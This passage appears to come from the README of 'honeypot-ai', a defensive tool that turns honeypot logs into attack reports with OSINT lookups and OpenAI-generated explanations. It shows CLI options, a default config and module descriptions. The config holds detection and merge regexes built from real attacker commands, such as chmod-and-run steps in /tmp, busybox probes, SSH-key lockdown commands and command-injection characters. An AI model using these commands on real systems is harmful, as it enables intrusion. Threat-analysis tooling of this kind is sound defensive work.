  --only-attacks ATTACK_IDS [ATTACK_IDS ...]
                        Only load attacks with these keys
  --skip-attacks ATTACK_IDS [ATTACK_IDS ...]
                        Skip loading attacks with these keys
  --max-ips-per-attack MAX_IPS_PER_ATTACK
                        Maximum number of IPs in each loaded attack
  --max-attacks MAX_ATTACKS
                        Maximum number of attacks to load
  --sort-attrs SORT_ATTRS [SORT_ATTRS ...]
                        Order of attrs to sort attacks by (default: ['num_source_ips', 'num_sessions', 'num_commands', 'num_malware', 'num_http_requests'])
  --sort-order SORT_ORDER
                        Order to sort attacks by (asc or desc) (default: desc)
  --load-attacks-max-workers LOAD_ATTACKS_MAX_WORKERS
                        Maximum number of worker processes to use when loading attacks from the attacks directory (default: 2)

Log Types:
  Log types to process

  --log-types LOG_TYPES [LOG_TYPES ...]
                        Log types to process (default: ['cowrie', 'zeek'])
  --zeek-log-types ZEEK_LOG_TYPES [ZEEK_LOG_TYPES ...]
                        Zeek log types to process (default: ['http', 'conn'])
  --zeek-log-ext ZEEK_LOG_EXT
                        Zeek log file extension (default: .log)
  --zeek-keep-empty-fields, --no-zeek-keep-empty-fields
                        Whether or not to keep empty fields in Zeek logs (default: True)
  --zeek-keep-unset-fields, --no-zeek-keep-unset-fields
                        Whether or not to keep unset fields in Zeek logs (default: False)
  --zeek-logs-path ZEEK_LOGS_PATH
                        Path to the zeek logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/zeek)

Attack Conditions:
  Conditions for determining which SourceIPs should be included in an Attack

  --attack-min-commands ATTACK_MIN_COMMANDS, --min-commands ATTACK_MIN_COMMANDS
                        Minimum number of commands used for SourceIP included in an Attack (default: 1)
  --attack-min-malware ATTACK_MIN_MALWARE, --min-malware ATTACK_MIN_MALWARE
                        Minimum number of malware files for SourceIP included in an Attack (default: 1)
  --attack-min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS, --min-successful-logins ATTACK_MIN_SUCCESSFUL_LOGINS
                        Minimum number of successful logins for SourceIP included in an Attack (default: 1)
  --attack-min-http-requests ATTACK_MIN_HTTP_REQUESTS, --min-http-requests ATTACK_MIN_HTTP_REQUESTS
                        Minimum number of HTTP requests for SourceIP included in an Attack (default: 1)
  --attack-http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...], --http-uri-regexes ATTACK_HTTP_URI_REGEXES [ATTACK_HTTP_URI_REGEXES ...]
                        Regexes to match anywhere in the HTTP request URI that should be considered attacks (default: ['(\\||\\$|\\`|;|\\-\\-|\\{|\\}|\\[|\\]|\\(|\\)|<|>|\\\\|\\^|\\~|\\!|\\$?\\{?IFS\\}?|\\.\\/)'])
  --attack-http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...], --http-anywhere-regexes ATTACK_HTTP_ANYWHERE_REGEXES [ATTACK_HTTP_ANYWHERE_REGEXES ...]
                        Regexes to match anywhere in the HTTP request that should be considered attacks (default: ['(\\||\\$|\\`|\\{|\\}|<|>|\\\\[^n]|\\^|\\!|\\$?\\{?IFS\\}?|\\.\\/)'])

Standardization Regexes:
  Regexes to match in commands, malware, and HTTP requests that should be standardized before hashing and comparing values. All captured groups will be replaced with X.

  --standardize-regex-commands STANDARDIZE_REGEX_COMMANDS [STANDARDIZE_REGEX_COMMANDS ...]
                        Regexes to match in commands that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: ['/bin/busybox (\\w+)', '/tmp/([\\w\\d]+)',
                        '/tmp/[\\w\\d]+ ([\\w/\\+]+)', '(\\d+\\.\\d+\\.\\d+\\.\\d+[:/]\\d+)'])
  --standardize-regex-malware STANDARDIZE_REGEX_MALWARE [STANDARDIZE_REGEX_MALWARE ...]
                        Regexes to match in malware that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: ['C0755 4745 (\\S+)'])
  --standardize-regex-http-requests STANDARDIZE_REGEX_HTTP_REQUESTS [STANDARDIZE_REGEX_HTTP_REQUESTS ...]
                        Regexes to match in HTTP requests that should be standardized before hashing. All captured groups will be replaced with X before hashing. (default: [])

Merge Conditions:
  Conditions for merging attacks

  --merge-shared-attrs MERGE_SHARED_ATTRS [MERGE_SHARED_ATTRS ...]
                        Attributes to automatically merge attacks on when any are shared (default: ['src_ips', 'malware', 'cmdlog_ips', 'cmdlog_urls', 'malware_ips', 'malware_urls'])
  --merge-regex-commands MERGE_REGEX_COMMANDS [MERGE_REGEX_COMMANDS ...]
                        Regexes to match in commands of attacks that should be merged (default: [">\\??A@/ ?X'8ELFX", 'cat /proc/mounts; /bin/busybox [\\w\\d]+', 'cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+',
                        'cd ~; chattr -ia .ssh; lockr -ia .ssh'])
  --merge-regex-malware MERGE_REGEX_MALWARE [MERGE_REGEX_MALWARE ...]
                        Regexes to match in malware of attacks that should be merged (default: [])
  --merge-regex-http-requests MERGE_REGEX_HTTP_REQUESTS [MERGE_REGEX_HTTP_REQUESTS ...]
                        Regexes to match in HTTP requests of attacks that should be merged (default: ['GET /shell\\?cd\\+/tmp'])

Organizer Settings:
  Settings for organizing attacks into attack directories

  --organizer-overwrite, --no-organizer-overwrite, --overwrite, --no-overwrite
                        Whether or not to overwrite existing attack directories when organizing (default: True)
  --organizer-iterby ORGANIZER_ITERBY, --iterby ORGANIZER_ITERBY
                        How to iterate when organizing (logs or attacks) (default: logs)
  --organizer-concurrency-type ORGANIZER_CONCURRENCY_TYPE, --concurrency-type ORGANIZER_CONCURRENCY_TYPE
                        How to run organizing concurrently (processes or threads) (default: multiprocessing)
  --organizer-max-workers ORGANIZER_MAX_WORKERS, --max-workers ORGANIZER_MAX_WORKERS
                        Maximum number of workers (processes or threads) to use when organizing (default: None)
  --organizer-chunksize ORGANIZER_CHUNKSIZE, --chunksize ORGANIZER_CHUNKSIZE
                        Chunksize to use when organizing (default: 1)
  --organizer-yield-order ORGANIZER_YIELD_ORDER, --yield-order ORGANIZER_YIELD_ORDER
                        Order to yield results when organizing (as_completed or as_submitted) (default: as_completed)
  --organizer-ip-subdirs, --no-organizer-ip-subdirs, --ip-subdirs, --no-ip-subdirs
                        Whether or not to organize attacks into subdirectories by IP (default: False)

OpenAI Analyzer Settings:
  Settings for OpenAIAnalyzer

  --use-openai, --no-use-openai, --openai, --no-openai
                        Whether or not to run the OpenAIAnalyzer (default: True)
  --use-openai-code-interpreter, --no-use-openai-code-interpreter, --openai-code-interpreter, --no-openai-code-interpreter
                        Whether or not to use the OpenAI Code Interpreter (default: True)
  --openai-api-key OPENAI_API_KEY
                        OpenAI API Key (Get from https://platform.openai.com/api-keys) (default: <PASTE YOUR API KEY HERE>)
  --openai-model OPENAI_MODEL
                        OpenAI Model to use (Get from https://platform.openai.com/docs/models) (default: gpt-4-1106-preview)
  --openai-training-data-path OPENAI_TRAINING_DATA_PATH
                        Path to the openai-training-data directory (default: ./honeypot-ai/resources/openai-training-data)

IP Analyzer and Webdriver Settings:
  Settings for analyzing OSINT on IPs with IPAnalyzer and Selenium webdrivers

  --use-ipanalyzer, --no-use-ipanalyzer, --ipanalyzer, --no-ipanalyzer
                        Whether or not to run the IPAnalyzer (default: True)
  --ipanalyzer-sources IPANALYZER_SOURCES [IPANALYZER_SOURCES ...]
                        Sources to use for the IPAnalyzer (default: ['isc', 'whois', 'cybergordon', 'threatfox', 'shodan'])
  --ipanalyzer-max-errors IPANALYZER_MAX_ERRORS
                        Maximum number of errors allowed before a source is skipped (default: 5)
  --webdriver-path WEBDRIVER_PATH
                        Path to the webdriver executable for use with Selenium via SouperScraper (default: ./resources/chromedriver)
  --webdriver-type WEBDRIVER_TYPE
                        Type of webdriver executable for use with Selenium via SouperScraper (chrome, firefox, edge, safari, etc.) (default: chrome)

Malware Analyzer Settings:
  Settings for analyzing OSINT on malware samples with MalwareAnalyzer

  --use-malwareanalyzer, --no-use-malwareanalyzer, --malwareanalyzer, --no-malwareanalyzer
                        Whether or not to run the MalwareAnalyzer (default: True)
  --malwareanalyzer-sources MALWAREANALYZER_SOURCES [MALWAREANALYZER_SOURCES ...]
                        Sources to use for the MalwareAnalyzer (default: ['exploitdb', 'malpedia', 'malwarebazaar', 'threatfox', 'urlhaus'])
  --malwareanalyzer-max-errors MALWAREANALYZER_MAX_ERRORS
                        Maximum number of errors allowed before a source is skipped (default: 5)
  --malwareanalyzer-allow-downloads, --no-malwareanalyzer-allow-downloads
                        Weather or not to malware analyzer to attempt to download failed malware samples from Urlhaus (default: False)

User and Honeypot Environment Settings:
  Settings specific to the user and honeypot environment

  --user-ips USER_IPS [USER_IPS ...]
                        IPs that belong to the user to be excluded from analysis (default: [])
  --honeypot-external-ips HONEYPOT_EXTERNAL_IPS [HONEYPOT_EXTERNAL_IPS ...]
                        External IPs of the honeypot system(s) to inform AI for more accurate analysis (default: [])
  --honeypot-internal-ips HONEYPOT_INTERNAL_IPS [HONEYPOT_INTERNAL_IPS ...]
                        Interal IPs of the honeypot system(s) to inform AI for more accurate analysis (default: [])
  --honeypot-ports HONEYPOT_PORTS [HONEYPOT_PORTS ...]
                        Open ports of on honeypot system(s) to inform AI for more accurate analysis (default: [22, 23, 80, 2222, 2223, 2323, 5555, 7547, 8000, 8080, 9000])
  --honeypot-software HONEYPOT_SOFTWARE [HONEYPOT_SOFTWARE ...]
                        Version strings of the software running on each open port of the honeypot system(s) to inform AI for more accurate analysis. (default: ['Cowrie SSH server running OpenSSH 6.0p1 Debian 4+deb7u2
                        (protocol 2.0)', 'Cowrie Telnet server', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Cowrie SSH server running OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)', 'Cowrie Telnet
                        server', 'Cowrie Telnet server', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and
                        WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7', 'Web server running Apache httpd 3.2.3 and WordPress 5.6.7'])

Input Paths:
  Paths to input logs and files

  --logs-path LOGS_PATH
                        Path to the logs directory (default: ./logs)
  --cowrie-logs-path COWRIE_LOGS_PATH
                        Path to the cowrie logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/cowrie)
  --firewall-logs-path FIREWALL_LOGS_PATH
                        Path to the firewall logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/firewall)
  --web-logs-path WEB_LOGS_PATH
                        Path to the web logs directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/web)
  --malware-downloads-path MALWARE_DOWNLOADS_PATH
                        Path to the malware downloads directory (Should be a subdirectory of LOGS_PATH) (default: ./logs/malware/downloads)
  --auth-random-path AUTH_RANDOM_PATH
                        Path to the auth_random.json file (Should be a subdirectory of LOGS_PATH) (default: ./logs/auth_random.json)
  --resources-path RESOURCES_PATH
                        Path to the resources directory (default: ./resources)

Output Paths:
  Paths to output files and directories

  --attacks-path ATTACKS_PATH
                        Path to the attacks directory where Attack data will be stored and loaded from (default: ./attacks)
  --db-path DB_PATH     Path to the db directory where IP, Malware, and OpenAI data will be stored and loaded from (default: ./db)
  --ipdb-path IPDB_PATH
                        Path to the ipdb directory where IP data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/ipdb)
  --mwdb-path MWDB_PATH
                        Path to the mwdb directory where Malware data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/mwdb)
  --aidb-path AIDB_PATH
                        Path to the aidb directory where OpenAI data will be stored and loaded from (Should be a subdirectory of DB_PATH) (default: ./db/aidb)
  --reports-path REPORTS_PATH
                        Path to the reports directory where attack markdown reports and files will be exported too (default: ./reports)

````
> For more advanced usage see comments in the source code and/or edit DEFAULT_CONFIG in [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py).

</details>

---


<details>
<summary>
<h2>Default Config</h2>
</summary>


````python
{'SORT_ATTRS': ['num_source_ips',
                'num_sessions',
                'num_commands',
                'num_malware',
                'num_http_requests'],
 'SORT_ORDER': 'desc',
 'LOAD_ATTACKS_MAX_WORKERS': 2,
 'LOG_TYPES': ['cowrie', 'zeek'],
 'ZEEK_LOG_TYPES': ['http', 'conn'],
 'ZEEK_LOG_EXT': '.log',
 'ZEEK_KEEP_EMPTY_FIELDS': True,
 'ZEEK_KEEP_UNSET_FIELDS': False,
 'ATTACK_MIN_COMMANDS': 1,
 'ATTACK_MIN_MALWARE': 1,
 'ATTACK_MIN_SUCCESSFUL_LOGINS': 1,
 'ATTACK_MIN_HTTP_REQUESTS': 1,
 'ATTACK_HTTP_URI_REGEXES': ['(\\||\\$|\\`|;|\\-\\-|\\{|\\}|\\[|\\]|\\(|\\)|<|>|\\\\|\\^|\\~|\\!|\\$?\\{?IFS\\}?|\\.\\/)'],
 'ATTACK_HTTP_ANYWHERE_REGEXES': ['(\\||\\$|\\`|\\{|\\}|<|>|\\\\[^n]|\\^|\\!|\\$?\\{?IFS\\}?|\\.\\/)'],
 'STANDARDIZE_REGEX_COMMANDS': ['/bin/busybox (\\w+)',
                                '/tmp/([\\w\\d]+)',
                                '/tmp/[\\w\\d]+ ([\\w/\\+]+)',
                                '(\\d+\\.\\d+\\.\\d+\\.\\d+[:/]\\d+)'],
 'STANDARDIZE_REGEX_MALWARE': ['C0755 4745 (\\S+)'],
 'STANDARDIZE_REGEX_HTTP_REQUESTS': [],
 'MERGE_SHARED_ATTRS': ['src_ips',
                        'malware',
                        'cmdlog_ips',
                        'cmdlog_urls',
                        'malware_ips',
                        'malware_urls'],
 'MERGE_REGEX_COMMANDS': [">\\??A@/ ?X'8ELFX",
                          'cat /proc/mounts; /bin/busybox [\\w\\d]+',
                          'cd /tmp && chmod \\+x [\\w\\d]+ && bash -c '
                          './[\\w\\d]+',
                          'cd ~; chattr -ia .ssh; lockr -ia .ssh'],
 'MERGE_REGEX_MALWARE': [],
 'MERGE_REGEX_HTTP_REQUESTS': ['GET /shell\\?cd\\+/tmp'],
 'ORGANIZER_OVERWRITE': True,
 'ORGANIZER_ITERBY': 'logs',
 'ORGANIZER_CONCURRENCY_TYPE': 'multiprocessing',
 'ORGANIZER_MAX_WORKERS': None,
 'ORGANIZER_CHUNKSIZE': 1,
 'ORGANIZER_YIELD_ORDER': 'as_completed',
 'ORGANIZER_IP_SUBDIRS': False,
 'USE_OPENAI': True,
 'USE_OPENAI_CODE_INTERPRETER': True,
 'OPENAI_API_KEY': '<PASTE YOUR API KEY HERE>',
 'OPENAI_MODEL': 'gpt-4-1106-preview',
 'OPENAI_TRAINING_DATA_PATH': './honeypot-ai/resources/openai-training-data',
 'USE_IPANALYZER': True,
 'IPANALYZER_SOURCES': ['isc', 'whois', 'cybergordon', 'threatfox', 'shodan'],
 'IPANALYZER_MAX_ERRORS': 5,
 'WEBDRIVER_PATH': './resources/chromedriver',
 'WEBDRIVER_TYPE': 'chrome',
 'USE_MALWAREANALYZER': True,
 'MALWAREANALYZER_SOURCES': ['exploitdb',
                             'malpedia',
                             'malwarebazaar',
                             'threatfox',
                             'urlhaus'],
 'MALWAREANALYZER_MAX_ERRORS': 5,
 'MALWAREANALYZER_ALLOW_DOWNLOADS': False,
 'USER_IPS': [],
 'HONEYPOT_EXTERNAL_IPS': [],
 'HONEYPOT_INTERNAL_IPS': [],
 'HONEYPOT_PORTS': [22, 23, 80, 2222, 2223, 2323, 5555, 7547, 8000, 8080, 9000],
 'HONEYPOT_SOFTWARE': ['Cowrie SSH server running OpenSSH 6.0p1 Debian '
                       '4+deb7u2 (protocol 2.0)',
                       'Cowrie Telnet server',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Cowrie SSH server running OpenSSH 6.0p1 Debian '
                       '4+deb7u2 (protocol 2.0)',
                       'Cowrie Telnet server',
                       'Cowrie Telnet server',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7',
                       'Web server running Apache httpd 3.2.3 and WordPress '
                       '5.6.7'],
 'LOGS_PATH': './logs',
 'COWRIE_LOGS_PATH': './logs/cowrie',
 'FIREWALL_LOGS_PATH': './logs/firewall',
 'WEB_LOGS_PATH': './logs/web',
 'ZEEK_LOGS_PATH': './logs/zeek',
 'MALWARE_DOWNLOADS_PATH': './logs/malware/downloads',
 'AUTH_RANDOM_PATH': './logs/auth_random.json',
 'RESOURCES_PATH': './resources',
 'ATTACKS_PATH': './attacks',
 'DB_PATH': './db',
 'IPDB_PATH': './db/ipdb',
 'MWDB_PATH': './db/mwdb',
 'AIDB_PATH': './db/aidb',
 'REPORTS_PATH': './reports'}

````

</details>

---


<details>
<summary>
<h2>Module Descriptions</h2>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/main.py)
> Main script for initializing and running all analyzer objects according to command line arguments and config file

#### [attackanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/attackanalyzer.py)
> High level class for running OSINTAnalyzers and OpenAIAnalyzer on Attack objects after being created by the LogProcessor

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [baseobjects.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/baseobjects.py) | Custom base classes for all objects. CachePropertyObject allows temporary caching of properties for faster processing while remaining dynamic. SmartAttrObject allows properties to be called with modifiers like uniq_ and num_ |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by LogProcessor and modified by OSINTAnalyzers and OpenAIAnalyzers |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and reading Attack directories

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logparser.py) | Classes for reading all logs into Python objects with standardized keys |
| [logprocessor.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/logprocessor.py) | Processes logs into Attack objects by creating SourceIP, Session, and Malware objects and adding them to an Attack object when specified conditions are met. |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/loganalyzers/attackdirreader.py) | Reads and counts log events in Attack directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completions and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about an Attack object and its subobjects |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [malwareanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/malwareanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, Malpedia, and Explot-DB |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [attackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/attackmarkdownwriter.py) | Markdown writer for Attack objects following ISC format |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [runstepsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/runstepsmarkdownwriter.py) | Markdown writer for AI RunSteps for questions asked by the OpenAIAssistantAnalyzer when processed by the AttackAnalyzer and when in interactive mode |
| [docsmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/docsmarkdownwriter.py) | Markdown writer for the honeypot-ai project documentation and README |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts']. (Not currently used due to crowding) |

#### [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)
> Setup script for installing the honeypot-ai project

#### [setup](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup)
> Scripts for setting up the honeypot-ai project

| Script | Description |
| --- | --- |
| [requirements.txt](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/requirements.txt) | List of all required packages for the honeypot-ai project |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |
| [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) | Utility script to sync logs from honeypot to honeypot-ai project logs directory |
| [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh) | Utility script to install Zeek on a remote honeypot |

</details>

---

